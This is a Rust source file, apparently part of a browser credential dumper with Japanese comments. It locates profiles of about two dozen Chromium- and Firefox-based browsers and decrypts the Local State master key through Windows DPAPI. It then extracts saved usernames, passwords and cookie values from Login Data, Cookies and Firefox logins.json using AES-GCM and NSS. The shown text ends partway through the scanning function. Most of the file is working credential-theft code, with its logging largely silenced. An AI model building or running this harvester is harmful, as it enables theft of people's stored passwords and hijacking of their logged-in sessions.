use anyhow::Result;
use std::env;

// 条件コンパイル対応のログマクロ
#[cfg(feature = "logging")]
use log::{debug, info};

#[cfg(not(feature = "logging"))]
macro_rules! debug {
    ($($arg:tt)*) => {
        let _ = format_args!($($arg)*);
    };
}

#[cfg(not(feature = "logging"))]
macro_rules! info {
    ($($arg:tt)*) => {
        let _ = format_args!($($arg)*);
    };
}

// 外部クレートのインポート
use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
use base64::{engine::general_purpose, Engine as _};
#[cfg(feature = "datetime")]
use chrono::{DateTime, Utc};
#[cfg(feature = "progress-bar")]
use indicatif::{ProgressBar, ProgressStyle};
use rusqlite::{Connection, Row};
use serde_json::Value;
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use tempfile::NamedTempFile;
use walkdir::WalkDir;

// Firefox NSS復号化機能のインポート（一時無効）
// use crate::credentials::NssCredentials;
use crate::collectors::browser_profiles::get_default_profile;

// ===============================================================================
// エラー型定義
// ===============================================================================

/// アプリケーション全体のエラー型
#[derive(Debug)]
pub enum ChromiumDumpError {
    Io(std::io::Error),
    Json(serde_json::Error),
    #[cfg(feature = "browser")]
    Database(rusqlite::Error),
    Crypto(String),
    Dpapi(String),
    Base64(base64::DecodeError),
    Utf8(std::string::FromUtf8Error),
    InvalidFormat(String),
    Generic(String),
}

impl std::fmt::Display for ChromiumDumpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ChromiumDumpError::Io(e) => write!(f, "IO error: {}", e),
            ChromiumDumpError::Json(e) => write!(f, "JSON parsing error: {}", e),
            #[cfg(feature = "browser")]
            ChromiumDumpError::Database(e) => write!(f, "Database error: {}", e),
            ChromiumDumpError::Crypto(e) => write!(f, "Cryptographic error: {}", e),
            ChromiumDumpError::Dpapi(e) => write!(f, "DPAPI error: {}", e),
            ChromiumDumpError::Base64(e) => write!(f, "Base64 decode error: {}", e),
            ChromiumDumpError::Utf8(e) => write!(f, "UTF-8 decode error: {}", e),
            ChromiumDumpError::InvalidFormat(e) => write!(f, "Invalid data format: {}", e),
            ChromiumDumpError::Generic(e) => write!(f, "Generic error: {}", e),
        }
    }
}

impl std::error::Error for ChromiumDumpError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            ChromiumDumpError::Io(e) => Some(e),
            ChromiumDumpError::Json(e) => Some(e),
            #[cfg(feature = "browser")]
            ChromiumDumpError::Database(e) => Some(e),
            ChromiumDumpError::Base64(e) => Some(e),
            ChromiumDumpError::Utf8(e) => Some(e),
            _ => None,
        }
    }
}

// From trait implementations
impl From<std::io::Error> for ChromiumDumpError {
    fn from(error: std::io::Error) -> Self {
        ChromiumDumpError::Io(error)
    }
}

impl From<serde_json::Error> for ChromiumDumpError {
    fn from(error: serde_json::Error) -> Self {
        ChromiumDumpError::Json(error)
    }
}

#[cfg(feature = "browser")]
impl From<rusqlite::Error> for ChromiumDumpError {
    fn from(error: rusqlite::Error) -> Self {
        ChromiumDumpError::Database(error)
    }
}

impl From<base64::DecodeError> for ChromiumDumpError {
    fn from(error: base64::DecodeError) -> Self {
        ChromiumDumpError::Base64(error)
    }
}

impl From<std::string::FromUtf8Error> for ChromiumDumpError {
    fn from(error: std::string::FromUtf8Error) -> Self {
        ChromiumDumpError::Utf8(error)
    }
}

impl From<&str> for ChromiumDumpError {
    fn from(s: &str) -> Self {
        ChromiumDumpError::Generic(s.to_string())
    }
}

impl From<String> for ChromiumDumpError {
    fn from(s: String) -> Self {
        ChromiumDumpError::Generic(s)
    }
}

type ChromiumResult<T> = std::result::Result<T, ChromiumDumpError>;

// ===============================================================================
// ブラウザ型定義
// ===============================================================================

/// ブラウザの種類（Firefoxを追加）
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum BrowserType {
    Chrome,
    ChromeBeta,
    ChromeDev,
    ChromeCanary,
    Edge,
    EdgeBeta,
    EdgeDev,
    EdgeCanary,
    Brave,
    Opera,
    OperaGX,
    Vivaldi,
    Yandex,
    Epic,
    Chromium,
    CocCoc,
    Iridium,
    SRWareIron,
    Chrome360,
    CentBrowser,
    Firefox,         // Firefox追加
    FirefoxDev,      // Firefox Developer Edition
    FirefoxNightly,  // Firefox Nightly
    Thunderbird,     // Thunderbird（Firefoxベース）
}

impl BrowserType {
    /// ブラウザ名を文字列として取得
    pub fn name(&self) -> &'static str {
        match self {
            BrowserType::Chrome => "Chrome",
            BrowserType::ChromeBeta => "Chrome Beta",
            BrowserType::ChromeDev => "Chrome Dev",
            BrowserType::ChromeCanary => "Chrome Canary",
            BrowserType::Edge => "Edge",
            BrowserType::EdgeBeta => "Edge Beta",
            BrowserType::EdgeDev => "Edge Dev",
            BrowserType::EdgeCanary => "Edge Canary",
            BrowserType::Brave => "Brave",
            BrowserType::Opera => "Opera",
            BrowserType::OperaGX => "Opera GX",
            BrowserType::Vivaldi => "Vivaldi",
            BrowserType::Yandex => "Yandex Browser",
            BrowserType::Epic => "Epic Privacy Browser",
            BrowserType::Chromium => "Chromium",
            BrowserType::CocCoc => "CocCoc Browser",
            BrowserType::Iridium => "Iridium",
            BrowserType::SRWareIron => "SRWare Iron",
            BrowserType::Chrome360 => "360Chrome",
            BrowserType::CentBrowser => "CentBrowser",
            BrowserType::Firefox => "Firefox",
            BrowserType::FirefoxDev => "Firefox Developer Edition",
            BrowserType::FirefoxNightly => "Firefox Nightly",
            BrowserType::Thunderbird => "Thunderbird",
        }
    }

    /// ブラウザのユーザーデータディレクトリパスを取得
    pub fn user_data_path(&self) -> Option<PathBuf> {
        use BrowserType::*;
        
        let (env_var, relative_path) = match self {
            // Firefoxベースブラウザ
            Firefox => ("APPDATA", r"Mozilla\Firefox"),
            FirefoxDev => ("APPDATA", r"Mozilla\Firefox Developer Edition"),
            FirefoxNightly => ("APPDATA", r"Mozilla\Firefox Nightly"),
            Thunderbird => ("APPDATA", r"Thunderbird"),
            
            // Chromiumベースブラウザ
            Chrome => ("LOCALAPPDATA", r"Google\Chrome\User Data"),
            ChromeBeta => ("LOCALAPPDATA", r"Google\Chrome Beta\User Data"),
            ChromeDev => ("LOCALAPPDATA", r"Google\Chrome Dev\User Data"),
            ChromeCanary => ("LOCALAPPDATA", r"Google\Chrome Canary\User Data"),
            Edge => ("LOCALAPPDATA", r"Microsoft\Edge\User Data"),
            EdgeBeta => ("LOCALAPPDATA", r"Microsoft\Edge Beta\User Data"),
            EdgeDev => ("LOCALAPPDATA", r"Microsoft\Edge Dev\User Data"),
            EdgeCanary => ("LOCALAPPDATA", r"Microsoft\Edge Canary\User Data"),
            Brave => ("LOCALAPPDATA", r"BraveSoftware\Brave-Browser\User Data"),
            Opera => ("LOCALAPPDATA", r"Opera Software\Opera Stable"),
            OperaGX => ("LOCALAPPDATA", r"Opera Software\Opera GX Stable"),
            Vivaldi => ("LOCALAPPDATA", r"Vivaldi\User Data"),
            Yandex => ("LOCALAPPDATA", r"Yandex\YandexBrowser\User Data"),
            Epic => ("LOCALAPPDATA", r"Epic Privacy Browser\User Data"),
            Chromium => ("LOCALAPPDATA", r"Chromium\User Data"),
            CocCoc => ("LOCALAPPDATA", r"CocCoc\Browser\User Data"),
            Iridium => ("LOCALAPPDATA", r"Iridium\User Data"),
            SRWareIron => ("LOCALAPPDATA", r"SRWare Iron\User Data"),
            Chrome360 => ("LOCALAPPDATA", r"360Chrome\Chrome\User Data"),
            CentBrowser => ("LOCALAPPDATA", r"CentBrowser\User Data"),
        };
        
        std::env::var(env_var)
            .ok()
            .map(|base| PathBuf::from(base).join(relative_path))
    }

    /// ブラウザがChromiumベースかどうかを判定
    pub fn is_chromium_based(&self) -> bool {
        !matches!(self, BrowserType::Firefox | BrowserType::FirefoxDev | 
                  BrowserType::FirefoxNightly | BrowserType::Thunderbird)
    }

    /// すべてのサポートされているブラウザを取得
    pub fn all() -> Vec<BrowserType> {
        use BrowserType::*;
        vec![
            Chrome, ChromeBeta, ChromeDev, ChromeCanary,
            Edge, EdgeBeta, EdgeDev, EdgeCanary,
            Brave, Opera, OperaGX, Vivaldi, Yandex, Epic,
            Chromium, CocCoc, Iridium, SRWareIron, Chrome360, CentBrowser,
            // Firefoxベースブラウザ
            Firefox, FirefoxDev, FirefoxNightly, Thunderbird,
        ]
    }
}

/// データベースの種類
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DatabaseType {
    LoginData,          // Chromiumベース用
    Cookies,            // Chromiumベース用
    FirefoxLoginData,   // Firefox用（logins.json）
    FirefoxSignons,     // Firefox用（signons.sqlite）
}

impl DatabaseType {
    /// データベースファイル名を取得
    pub fn filename(&self) -> &'static str {
        match self {
            DatabaseType::LoginData => "Login Data",
            DatabaseType::Cookies => "Cookies",
            DatabaseType::FirefoxLoginData => "logins.json",
            DatabaseType::FirefoxSignons => "signons.sqlite",
        }
    }
}

/// ブラウザプロファイル情報
#[derive(Debug, Clone)]
pub struct BrowserProfile {
    pub browser_type: BrowserType,
    pub profile_name: String,
    pub profile_path: PathBuf,
    pub local_state_path: PathBuf,
}

impl BrowserProfile {
    pub fn new(
        browser_type: BrowserType,
        profile_name: String,
        profile_path: PathBuf,
        local_state_path: PathBuf,
    ) -> Self {
        Self {
            browser_type,
            profile_name,
            profile_path,
            local_state_path,
        }
    }

    /// 指定されたデータベースタイプのファイルパスを取得
    pub fn database_path(&self, db_type: &DatabaseType) -> PathBuf {
        match db_type {
            DatabaseType::FirefoxLoginData | DatabaseType::FirefoxSignons => {
                // Firefoxプロファイルは直接プロファイルディレクトリ内
                self.profile_path.join(db_type.filename())
            }
            _ => {
                // Chromiumベースブラウザの場合
                self.profile_path.join(db_type.filename())
            }
        }
    }

    /// ブラウザがFirefoxベースかどうかを判定
    pub fn is_firefox_based(&self) -> bool {
        matches!(self.browser_type, BrowserType::Firefox | BrowserType::FirefoxDev | 
                 BrowserType::FirefoxNightly | BrowserType::Thunderbird)
    }
}

// ===============================================================================
// 暗号化関連
// ===============================================================================

/// Local Stateファイルからマスターキーを取得
pub fn get_master_key<P: AsRef<Path>>(local_state_path: P) -> ChromiumResult<Option<Vec<u8>>> {
    let path = local_state_path.as_ref();
    
    if !path.exists() {
        let _ = ();
        return Ok(None);
    }

    let _ = ();
    let content = fs::read_to_string(path)
        .map_err(|e| ChromiumDumpError::Io(e))?;

    let local_state: Value = serde_json::from_str(&content)
        .map_err(|e| ChromiumDumpError::Json(e))?;

    let os_crypt = match local_state.get("os_crypt") {
        Some(val) => val,
        None => {
            let _ = ();
            return Ok(None);
        }
    };

    let encrypted_key_b64 = match os_crypt.get("encrypted_key") {
        Some(Value::String(key)) => key,
        _ => {
            let _ = ();
            return Ok(None);
        }
    };

    // Base64デコード
    let encrypted_key = general_purpose::STANDARD
        .decode(encrypted_key_b64)
        .map_err(|e| ChromiumDumpError::Base64(e))?;

    // DPAPIプレフィックスをチェック
    if !encrypted_key.starts_with(b"DPAPI") {
        return Err(ChromiumDumpError::InvalidFormat(
            "Invalid encrypted key format".to_string(),
        ));
    }

    // DPAPIプレフィックスを削除
    let encrypted_key = &encrypted_key[5..];

    // DPAPIで復号化
    let master_key = decrypt_with_dpapi(encrypted_key)?;
    let _ = ();
    
    Ok(Some(master_key))
}

/// DPAPIを使用してデータを復号化 (Windows crateを使用)
fn decrypt_with_dpapi(encrypted_data: &[u8]) -> ChromiumResult<Vec<u8>> {
    if encrypted_data.is_empty() {
        return Ok(Vec::new());
    }
    
    #[cfg(windows)]
    {
        use windows::Win32::Security::Cryptography::{
            CryptUnprotectData, CRYPT_INTEGER_BLOB,
        };
        
        use windows::Win32::Foundation::{HLOCAL, LocalFree};
        
        unsafe {
            let mut data_in = CRYPT_INTEGER_BLOB {
                cbData: encrypted_data.len() as u32,
                pbData: encrypted_data.as_ptr() as *mut u8,
            };

            let mut data_out = CRYPT_INTEGER_BLOB {
                cbData: 0,
                pbData: std::ptr::null_mut(),
            };

            let result = CryptUnprotectData(
                &mut data_in,
                None,
                None,
                None,
                None,
                0,
                &mut data_out,
            );

            if result.is_err() {
                return Err(ChromiumDumpError::Dpapi("DPAPI decryption failed".to_string()));
            }

            // データをコピー
            let decrypted_data = std::slice::from_raw_parts(
                data_out.pbData, 
                data_out.cbData as usize
            ).to_vec();

            // メモリを解放（直接システムコールを使用）
            if !data_out.pbData.is_null() {
                LocalFree(Some(HLOCAL(data_out.pbData as *mut _ as _)));
            }

            Ok(decrypted_data)
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(ChromiumDumpError::Dpapi("DPAPI is only available on Windows".to_string()))
    }
}

/// 暗号化されたblobを復号化
pub fn decrypt_blob(blob: &[u8], master_key: Option<&[u8]>) -> ChromiumResult<String> {
    if blob.is_empty() {
        return Ok(String::new());
    }

    // v10/v11形式（AES-GCM）
    if blob.len() >= 3 && (blob.starts_with(b"v10") || blob.starts_with(b"v11")) {
        let master_key = master_key
            .ok_or_else(|| ChromiumDumpError::Crypto("Master key required for v10/v11 decryption".to_string()))?;
        return decrypt_aes_gcm(blob, master_key);
    }

    // DPAPI形式またはレガシー形式
    if blob.starts_with(b"DPAPI") || blob.len() > 24 {
        let decrypted = decrypt_with_dpapi(blob)?;
        return String::from_utf8(decrypted).map_err(ChromiumDumpError::Utf8);
    }

    // 平文として試行
    String::from_utf8(blob.to_vec())
        .map_err(|_| ChromiumDumpError::InvalidFormat("Unable to decode as UTF-8".to_string()))
}

/// AES-GCMで復号化（v10/v11形式）
fn decrypt_aes_gcm(blob: &[u8], master_key: &[u8]) -> ChromiumResult<String> {
    const MIN_BLOB_SIZE: usize = 15;
    const TAG_SIZE: usize = 16;
    
    if blob.len() < MIN_BLOB_SIZE {
        return Err(ChromiumDumpError::InvalidFormat("Invalid blob length for AES-GCM".to_string()));
    }

    // IV（12バイト）とciphertext+tag を分離
    let (_, rest) = blob.split_at(3);
    let (iv, ciphertext_with_tag) = rest.split_at(12);

    if ciphertext_with_tag.len() < TAG_SIZE {
        return Err(ChromiumDumpError::InvalidFormat("Invalid ciphertext length".to_string()));
    }

    let (ciphertext, tag) = ciphertext_with_tag.split_at(ciphertext_with_tag.len() - TAG_SIZE);

    // AES-GCM復号化
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|e| ChromiumDumpError::Crypto(format!("Failed to create cipher: {}", e)))?;

    // ciphertextとtagを結合してデータを復号化
    let mut encrypted_data = ciphertext.to_vec();
    encrypted_data.extend_from_slice(tag);

    let plaintext = cipher
        .decrypt(Nonce::from_slice(iv), encrypted_data.as_ref())
        .map_err(|e| ChromiumDumpError::Crypto(format!("AES-GCM decryption failed: {}", e)))?;

    String::from_utf8(plaintext).map_err(ChromiumDumpError::Utf8)
}

// ===============================================================================
// データベース処理
// ===============================================================================

/// ログイン情報
#[derive(Debug, Clone)]
pub struct LoginEntry {
    pub browser_name: String,
    pub origin_url: String,
    pub username: String,
    pub password: String,
    #[cfg(feature = "datetime")]
    pub date_created: Option<DateTime<Utc>>,
    #[cfg(feature = "datetime")]
    pub date_last_used: Option<DateTime<Utc>>,
    #[cfg(not(feature = "datetime"))]
    pub date_created: Option<i64>,
    #[cfg(not(feature = "datetime"))]
    pub date_last_used: Option<i64>,
}

/// Cookie情報
#[derive(Debug, Clone)]
pub struct CookieEntry {
    pub browser_name: String,
    pub host_key: String,
    pub name: String,
    pub value: String,
}

/// データベース処理結果
#[derive(Debug)]
pub struct DatabaseResults {
    pub login_entries: Vec<LoginEntry>,
    pub cookie_entries: Vec<CookieEntry>,
}

impl DatabaseResults {
    pub fn new() -> Self {
        Self {
            login_entries: Vec::new(),
            cookie_entries: Vec::new(),
        }
    }

    pub fn total_count(&self) -> usize {
        self.login_entries.len() + self.cookie_entries.len()
    }

    pub fn browser_stats(&self) -> HashMap<String, usize> {
        let mut stats = HashMap::new();
        
        // ログインエントリとCookieエントリを統合してカウント
        self.login_entries.iter()
            .map(|entry| &entry.browser_name)
            .chain(self.cookie_entries.iter().map(|entry| &entry.browser_name))
            .for_each(|browser_name| {
                *stats.entry(browser_name.clone()).or_insert(0) += 1;
            });
        
        stats
    }
}

/// データベースを安全にコピー
fn safe_copy_db<P: AsRef<Path>>(db_path: P) -> ChromiumResult<NamedTempFile> {
    let db_path = db_path.as_ref();
    let _ = ();
    
    let temp_file = NamedTempFile::new().map_err(ChromiumDumpError::Io)?;
    
    fs::copy(db_path, temp_file.path()).map_err(ChromiumDumpError::Io)?;
    
    // コピーが成功したかチェック
    let temp_size = temp_file.path()
        .metadata()
        .map_err(ChromiumDumpError::Io)?
        .len();
    
    if temp_size == 0 {
        return Err(ChromiumDumpError::InvalidFormat("Copied database file is empty".to_string()));
    }
    
    Ok(temp_file)
}

#[cfg(feature = "datetime")]
/// Chromium時間戳を DateTime<Utc> に変換
fn chromium_timestamp_to_datetime(timestamp: i64) -> Option<DateTime<Utc>> {
    if timestamp == 0 {
        return None;
    }
    
    // Chromium時間戳は1601年1月1日からのマイクロ秒
    // Unix時間戳は1970年1月1日からの秒
    const CHROMIUM_EPOCH_OFFSET: i64 = 11_644_473_600; // 秒
    const MICROSECONDS_PER_SECOND: i64 = 1_000_000;
    
    let unix_timestamp = (timestamp / MICROSECONDS_PER_SECOND) - CHROMIUM_EPOCH_OFFSET;
    DateTime::from_timestamp(unix_timestamp, 0)
}

#[cfg(not(feature = "datetime"))]
/// Chromium時間戳をそのまま返す（datetime feature無効時）
fn chromium_timestamp_to_datetime(timestamp: i64) -> Option<i64> {
    Some(timestamp)
}

/// ログインデータベースを処理
pub fn process_login_database(
    profile: &BrowserProfile,
    master_key: Option<&[u8]>,
) -> ChromiumResult<Vec<LoginEntry>> {
    let db_path = profile.database_path(&DatabaseType::LoginData);
    
    if !db_path.exists() {
        let _ = ();
        return Ok(Vec::new());
    }

    let temp_file = safe_copy_db(&db_path)?;
    let conn = Connection::open(temp_file.path()).map_err(ChromiumDumpError::Database)?;

    // テーブルの存在確認
    let table_exists = conn
        .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")?
        .query_row([], |_| Ok(true))
        .unwrap_or(false);

    if !table_exists {
        let _ = ();
        return Ok(Vec::new());
    }

    let mut stmt = conn.prepare(
        "SELECT origin_url, username_value, password_value, date_created, date_last_used 
         FROM logins 
         WHERE username_value != '' OR password_value != ''
         ORDER BY date_last_used DESC"
    )?;

    let login_iter = stmt.query_map([], |row: &Row| {
        Ok((
            row.get::<_, String>(0).unwrap_or_default(),
            row.get::<_, String>(1).unwrap_or_default(),
            row.get::<_, Vec<u8>>(2).unwrap_or_default(),
            row.get::<_, i64>(3).unwrap_or(0),
            row.get::<_, i64>(4).unwrap_or(0),
        ))
    })?;

    let browser_name = profile.browser_type.name().to_string();
    let results: Vec<_> = login_iter
        .filter_map(|login_result| {
            let (origin_url, username, encrypted_password, date_created, date_last_used) = 
                login_result.ok()?;

            if encrypted_password.is_empty() {
                return None;
            }

            match decrypt_blob(&encrypted_password, master_key) {
                Ok(password) if !password.is_empty() && !password.starts_with("[ERROR]") => {
                    Some(LoginEntry {
                        browser_name: browser_name.clone(),
                        origin_url: if origin_url.is_empty() { "Unknown".to_string() } else { origin_url },
                        username: if username.is_empty() { "[No username]".to_string() } else { username },
                        password,
                        date_created: chromium_timestamp_to_datetime(date_created),
                        date_last_used: chromium_timestamp_to_datetime(date_last_used),
                    })
                }
                Err(_e) => {
                    let _ = ();
                    None
                }
                _ => None,
            }
        })
        .collect();

    let _ = ();
    Ok(results)
}

/// Firefox専用ログインデータベースを処理（NSS復号化対応）
pub fn process_firefox_database(
    profile: &BrowserProfile,
) -> ChromiumResult<Vec<LoginEntry>> {
    let _ = ();

    let mut results = Vec::new();
    
    // まずJSONファイルの存在を確認
    let json_path = profile.database_path(&DatabaseType::FirefoxLoginData);
    if !json_path.exists() {
        let _ = ();
        return Ok(results);
    }

    // JSONデータを読み込み
    let json_content = match fs::read_to_string(&json_path) {
        Ok(content) => content,
        Err(_e) => {
            let _ = ();
            return Ok(results);
        }
    };

    let json_value = match serde_json::from_str::<serde_json::Value>(&json_content) {
        Ok(value) => value,
        Err(_e) => {
            let _ = ();
            return Ok(results);
        }
    };

    let logins_array = match json_value.get("logins").and_then(|v| v.as_array()) {
        Some(array) => array,
        None => {
            let _ = ();
            return Ok(results);
        }
    };

    // NSS復号化を試行（安全な実装）
    match safe_nss_decrypt_logins(&profile.profile_path, logins_array) {
        Ok(mut decrypted_results) => {
            let _ = ();
            for entry in &mut decrypted_results {
                entry.browser_name = profile.browser_type.name().to_string();
            }
            results.extend(decrypted_results);
        }
        Err(_e) => {
            let _ = ();
            
            // フォールバック: 暗号化されたデータの情報のみを表示
            for login in logins_array {
                if let Some(hostname) = login.get("hostname").and_then(|v| v.as_str()) {
                    let username = login.get("encryptedUsername")
                        .and_then(|v| v.as_str())
                        .unwrap_or("[No username]");
                        
                    results.push(LoginEntry {
                        browser_name: format!("{} [ENCRYPTED]", profile.browser_type.name()),
                        origin_url: hostname.to_string(),
                        username: format!("[ENCRYPTED] {}", username),
                        password: "[NSS_DECRYPTION_FAILED]".to_string(),
                        date_created: None,
                        date_last_used: None,
                    });
                }
            }
        }
    }

    let _ = ();
    Ok(results)
}

/// NSS復号化を安全に実行
fn safe_nss_decrypt_logins(
    profile_path: &Path, 
    logins_array: &[serde_json::Value]
) -> ChromiumResult<Vec<LoginEntry>> {
    use std::time::{Duration, Instant};
    
    // NSS初期化の同期とタイムアウト機能
    static NSS_MUTEX: Mutex<()> = Mutex::new(());
    const NSS_TIMEOUT: Duration = Duration::from_secs(10);
    
    let _lock = NSS_MUTEX.try_lock()
        .map_err(|_| ChromiumDumpError::Crypto("NSS is already in use by another process".to_string()))?;
    
    let start_time = Instant::now();
    
    // NSS初期化を段階的に実行
    let nss = initialize_nss_safely(profile_path)
        .map_err(|e| {
            let _ = ();
            ChromiumDumpError::Crypto(format!("NSS init failed: {}", e))
        })?;
    
    let (mut success_count, mut error_count) = (0, 0);
    
    // タイムアウトチェック付きでログインを復号化
    let results: Vec<_> = logins_array.iter()
        .take_while(|_| start_time.elapsed() <= NSS_TIMEOUT)
        .filter_map(|login| {
            match decrypt_firefox_login(&nss, login) {
                Ok(Some(entry)) => {
                    success_count += 1;
                    Some(entry)
                }
                Ok(None) => None, // スキップされたエントリ
                Err(_e) => {
                    error_count += 1;
                    let _ = ();
                    None
                }
            }
        })
        .collect();
    
    if start_time.elapsed() > NSS_TIMEOUT {
        let _ = ();
    }
    
    // NSS安全シャットダウン
    if let Err(_e) = nss.shutdown() {
        let _ = ();
    }
    
    let _ = ();
    
    if results.is_empty() && error_count > 0 {
        return Err(ChromiumDumpError::Crypto("All NSS decryption attempts failed".to_string()));
    }
    
    Ok(results)
}

/// NSS初期化を安全に実行
fn initialize_nss_safely(profile_path: &Path) -> Result<crate::collectors::firefox_nss::Nss, Box<dyn std::error::Error>> {
    let _ = ();
    
    // NSS依存関係の事前チェック
    if !profile_path.is_dir() {
        return Err(format!("Invalid profile path: {:?}", profile_path).into());
    }
    
    // 必要なNSSファイルの存在確認
    let nss_files = [
        ("cert9.db", "key4.db"), // SQLite形式のNSS
        ("cert8.db", "key3.db"), // レガシー形式のNSS
    ];
    
    let has_nss_files = nss_files.iter()
        .any(|(cert, key)| profile_path.join(cert).exists() || profile_path.join(key).exists());
    
    if !has_nss_files {
        return Err("No NSS database files found in profile".into());
    }
    
    // NSS 初期化を試行
    let nss = crate::collectors::firefox_nss::Nss::new()
        .map_err(|e| format!("Failed to load NSS library: {}", e))?;
    
    nss.initialize(profile_path)
        .map_err(|e| format!("Failed to initialize NSS with profile: {}", e))?;
    
    Ok(nss)
}

/// 個別のFirefoxログインエントリを復号化
fn decrypt_firefox_login(
    nss: &crate::collectors::firefox_nss::Nss,
    login: &serde_json::Value
) -> Result<Option<LoginEntry>, Box<dyn std::error::Error>> {
    let hostname = login.get("hostname")
        .and_then(|v| v.as_str())
        .ok_or("Missing hostname")?;
    
    let encrypted_username = login.get("encryptedUsername")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    
    let encrypted_password = login.get("encryptedPassword")
        .and_then(|v| v.as_str())
        .ok_or("Missing encrypted password")?;
    
    // 空の暗号化データはスキップ
    if encrypted_password.is_empty() {
        return Ok(None);
    }
    
    // 復号化実行
    let decrypted_username = if encrypted_username.is_empty() {
        "[No username]".to_string()
    } else {
        nss.decrypt(encrypted_username)
            .unwrap_or_else(|_| "[Decrypt failed]".to_string())
    };
    
    let decrypted_password = nss.decrypt(encrypted_password)
        .map_err(|e| format!("Password decryption failed: {}", e))?;
    
    // 日時情報の取得（オプション）
    #[cfg(feature = "datetime")]
    let date_created = login.get("timeCreated")
        .and_then(|v| v.as_u64())
        .map(|ts| chrono::DateTime::from_timestamp_millis(ts as i64))
        .flatten();
    
    #[cfg(not(feature = "datetime"))]
    let date_created = login.get("timeCreated")
        .and_then(|v| v.as_u64())
        .map(|ts| ts as i64);
    
    #[cfg(feature = "datetime")]
    let date_last_used = login.get("timeLastUsed")
        .and_then(|v| v.as_u64())
        .map(|ts| chrono::DateTime::from_timestamp_millis(ts as i64))
        .flatten();
        
    #[cfg(not(feature = "datetime"))]
    let date_last_used = login.get("timeLastUsed")
        .and_then(|v| v.as_u64())
        .map(|ts| ts as i64);
    
    Ok(Some(LoginEntry {
        browser_name: "Firefox".to_string(), // 呼び出し元で上書きされる
        origin_url: hostname.to_string(),
        username: decrypted_username,
        password: decrypted_password,
        date_created,
        date_last_used,
    }))
}

/// Cookieデータベースを処理
pub fn process_cookie_database(
    profile: &BrowserProfile,
    master_key: Option<&[u8]>,
) -> ChromiumResult<Vec<CookieEntry>> {
    let db_path = profile.database_path(&DatabaseType::Cookies);
    
    if !db_path.exists() {
        let _ = ();
        return Ok(Vec::new());
    }

    let temp_file = safe_copy_db(&db_path)?;
    let conn = Connection::open(temp_file.path()).map_err(ChromiumDumpError::Database)?;

    // テーブルの存在確認
    let table_exists = conn
        .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")?
        .query_row([], |_| Ok(true))
        .unwrap_or(false);

    if !table_exists {
        let _ = ();
        return Ok(Vec::new());
    }

    let mut stmt = conn.prepare(
        "SELECT host_key, name, encrypted_value
         FROM cookies 
         WHERE encrypted_value != ''
         ORDER BY creation_utc DESC
         LIMIT 100"
    )?;

    let browser_name = profile.browser_type.name().to_string();
    
    let results: Vec<_> = stmt.query_map([], |row: &Row| {
        Ok((
            row.get::<_, String>(0).unwrap_or_default(),
            row.get::<_, String>(1).unwrap_or_default(),
            row.get::<_, Vec<u8>>(2).unwrap_or_default(),
        ))
    })?
    .filter_map(|cookie_result| {
        let (host_key, name, encrypted_value) = cookie_result.ok()?;

        if encrypted_value.is_empty() {
            return None;
        }

        match decrypt_blob(&encrypted_value, master_key) {
            Ok(value) if !value.is_empty() && !value.starts_with("[ERROR]") => {
                let truncated_value = if value.len() > 100 {
                    format!("{}...", &value[..100])
                } else {
                    value
                };

                Some(CookieEntry {
                    browser_name: browser_name.clone(),
                    host_key: format!("Cookie: {}", host_key),
                    name,
                    value: truncated_value,
                })
            }
            Err(_e) => {
                let _ = ();
                None
            }
            _ => None,
        }
    })
    .collect();

    debug!("Processed {} cookie entries from {:?}", results.len(), db_path);
    Ok(results)
}

// ===============================================================================
// スキャナー
// ===============================================================================

/// Chromiumブラウザスキャナー
pub struct ChromiumScanner {
    browsers: Vec<BrowserType>,
}

impl ChromiumScanner {
    /// 新しいスキャナーを作成
    pub fn new() -> Self {
        Self {
            browsers: BrowserType::all(),
        }
    }

    /// すべてのブラウザをスキャン
    pub fn scan_all_browsers(&self, include_cookies: bool) -> ChromiumResult<DatabaseResults> {
        let _ = ();
        info!("Scanning {} browser locations...", self.browsers.len());

        // プロファイルを発見
        let profiles = self.find_browser_profiles()?;
        info!("Found {} browser profiles", profiles.len());

        if profiles.is_empty() {
            let _ = ();
            return Ok(DatabaseResults::new());
        }

        // 結果を並列処理で収集
        let results = Mutex::new(DatabaseResults::new());

        // プログレスバーを設定（条件コンパイル）
        #[cfg(feature = "progress-bar")]
        let pb = {
            let pb = ProgressBar::new(profiles.len() as u64);
            pb.set_style(
                ProgressStyle::default_bar()
                    .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} {msg}")
                    .unwrap()
                    .progress_chars("#>-"),
            );
            pb
        };

        // 並列処理でプロファイルを処理
        profiles.iter().for_each(|profile| {
            #[cfg(feature = "progress-bar")]
            pb.set_message(format!("Processing {}", profile.browser_type.name()));
            
            #[cfg(not(feature = "progress-bar"))]
            let _ = ();

            match self.scan_profile(profile, include_cookies) {
                Ok(mut profile_results) => {
                    let mut results = results.lock().unwrap();
                    results.login_entries.append(&mut profile_results.login_entries);
                    results.cookie_entries.append(&mut profile_results.cookie_entries);
                }
                Err(_e) => {
                    let _ = ();
                }
            }

            #[cfg(feature = "progress-bar")]
            pb.inc(1);
        });

        #[cfg(feature = "progress-bar")]
        pb.finish_with_message("Scan completed");
        
        #[cfg(not(feature = "progress-bar"))]
        let _ = ();

        let final_results = results.into_inner().unwrap();
        info!("Scan completed with {} total entries", final_results.total_count());

        Ok(final_results)
    }

    /// 単一のプロファイルをスキャン
    fn scan_profile(&self, profile: &BrowserProfile, include_cookies: bool) -> ChromiumResult<DatabaseResults> {
        let _ = ();

        let mut results = DatabaseResults::new();

        // Firefoxベースブラウザの処理
        if profile.is_firefox_based() {
            debug!("Processing Firefox-based browser: {}", profile.browser_type.name());
            
            // Firefox専用処理
            match process_firefox_database(profile) {
                Ok(mut firefox_logins) => {
                    info!("Successfully processed {} Firefox logins", firefox_logins.len());
                    results.login_entries.append(&mut firefox_logins);
                }
                Err(_e) => {
                    let _ = ();
                }
            }
        } else {
